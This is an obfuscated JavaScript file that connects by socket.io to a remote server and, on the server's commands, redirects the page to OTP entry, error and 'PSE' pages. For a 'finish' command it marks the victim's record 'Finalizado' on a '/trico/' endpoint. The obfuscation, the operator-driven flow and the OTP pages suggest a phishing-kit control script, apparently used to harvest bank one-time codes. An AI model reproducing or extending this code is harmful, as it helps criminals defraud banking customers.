function _0x1aac() {
  const _0x939af9 = [
    "href",
    "stringify",
    "GET",
    "finish",
    "408244Gbojkm",
    "/trico/tricofinishPse/",
    "1545315CzjFBi",
    "valid",
    "Finalizado",
    "PUT",
    "user",
    "Usuario\x20encontrado",
    "2jjFDQG",
    "newOtp",
    "./otp.html",
    "location",
    "396180uBSWWf",
    "application/json",
    "log",
    "json",
    "1239867ncNZSB",
    "185499JWsNlA",
    "/trico/tricoData",
    "152yHfDAj",
    "metaInfo",
    "223506qtBbMB",
    "connect",
    "3835034gMprgN",
    "otp",
    "valor",
  ];
  _0x1aac = function () {
    return _0x939af9;
  };
  return _0x1aac();
}
function _0x15ea(_0x5a13a2, _0x3eba30) {
  const _0x1aacf5 = _0x1aac();
  return (
    (_0x15ea = function (_0x15eace, _0x39bcdd) {
      _0x15eace = _0x15eace - 0x19d;
      let _0x17f53f = _0x1aacf5[_0x15eace];
      return _0x17f53f;
    }),
    _0x15ea(_0x5a13a2, _0x3eba30)
  );
}
const _0xda249 = _0x15ea;
(function (_0x4197ba, _0x3194b2) {
  const _0x2b133b = _0x15ea,
    _0x5d4244 = _0x4197ba();
  while (!![]) {
    try {
      const _0x272703 =
        -parseInt(_0x2b133b(0x1b4)) / 0x1 +
        (-parseInt(_0x2b133b(0x1b0)) / 0x2) *
          (parseInt(_0x2b133b(0x1b8)) / 0x3) +
        -parseInt(_0x2b133b(0x1a8)) / 0x4 +
        parseInt(_0x2b133b(0x1aa)) / 0x5 +
        parseInt(_0x2b133b(0x19f)) / 0x6 +
        parseInt(_0x2b133b(0x1a1)) / 0x7 +
        (-parseInt(_0x2b133b(0x19d)) / 0x8) *
          (-parseInt(_0x2b133b(0x1b9)) / 0x9);
      if (_0x272703 === _0x3194b2) break;
      else _0x5d4244["push"](_0x5d4244["shift"]());
    } catch (_0x4ac9c1) {
      _0x5d4244["push"](_0x5d4244["shift"]());
    }
  }
})(_0x1aac, 0x5b5ef);
var socket = io[_0xda249(0x1a0)](url);
socket["on"]("ps", function (_0x13fd9c) {
  const _0x680151 = _0xda249;
  if (
    _0x13fd9c[_0x680151(0x1a3)] == _0x680151(0x1ae) &&
    _0x13fd9c["valid"] == info[_0x680151(0x19e)]["cc"]
  )
    window[_0x680151(0x1b3)][_0x680151(0x1a4)] = "./index.error.html";
  else {
    if (
      _0x13fd9c[_0x680151(0x1a3)] == _0x680151(0x1a2) &&
      _0x13fd9c[_0x680151(0x1ab)] == info["metaInfo"]["cc"]
    )
      window[_0x680151(0x1b3)][_0x680151(0x1a4)] = _0x680151(0x1b2);
    else {
      if (
        _0x13fd9c["valor"] == _0x680151(0x1b1) &&
        _0x13fd9c[_0x680151(0x1ab)] == info[_0x680151(0x19e)]["cc"]
      )
        window[_0x680151(0x1b3)][_0x680151(0x1a4)] = "./otp.error.html";
      else {
        if (
          _0x13fd9c[_0x680151(0x1a3)] == _0x680151(0x1a7) &&
          _0x13fd9c[_0x680151(0x1ab)] == info["metaInfo"]["cc"]
        ) {
          async function _0x4803d2() {
            const _0x1a73be = _0x680151,
              _0x280cba = await fetch(url + _0x1a73be(0x1ba), {
                method: _0x1a73be(0x1a6),
                headers: { "Content-Type": _0x1a73be(0x1b5) },
              }),
              _0x2240c5 = await _0x280cba[_0x1a73be(0x1b7)](),
              _0x1f7d2b = [..._0x2240c5];
            for (const _0x16f6d8 of _0x1f7d2b) {
              if (_0x16f6d8["id"] == info[_0x1a73be(0x19e)]["cc"]) {
                console[_0x1a73be(0x1b6)](_0x1a73be(0x1af));
                const _0x5cb1a6 = await fetch(
                    url + _0x1a73be(0x1a9) + _0x16f6d8["idreg"],
                    {
                      method: _0x1a73be(0x1ad),
                      headers: { "Content-Type": _0x1a73be(0x1b5) },
                      body: JSON[_0x1a73be(0x1a5)]({
                        estado: _0x1a73be(0x1ac),
                      }),
                    }
                  ),
                  _0x3ed735 = await _0x5cb1a6[_0x1a73be(0x1b7)]();
              }
            }
            window["location"][_0x1a73be(0x1a4)] = "./errorPse.html";
          }
          _0x4803d2();
          return;
        }
      }
    }
  }
});
